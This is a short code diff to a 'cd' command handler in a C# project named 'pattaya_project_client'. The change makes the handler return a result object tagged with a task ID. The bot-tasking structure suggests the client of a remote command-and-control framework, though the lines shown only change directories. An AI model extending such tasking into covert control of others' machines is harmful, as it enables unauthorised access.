@@ -10,7 +10,7 @@ namespace pattaya_project_client.Commands.Implements
     {
         public override string TaskName => "cd";
 
-        public override string RunTask(BotTask task)
+        public override BotTaskResult RunTask(BotTask task)
         {
             string path;
             var arguments = task.Arguments.Split(' ');
@@ -26,7 +26,11 @@ namespace pattaya_project_client.Commands.Implements
             }
 
             Directory.SetCurrentDirectory(path);
-            return "Changed Directory: " + Directory.GetCurrentDirectory();
+            return new BotTaskResult
+            {
+                TaskId = task.TaskId,
+                Result = "Changed Directory: " + Directory.GetCurrentDirectory()
+            };
         }
     }
 }
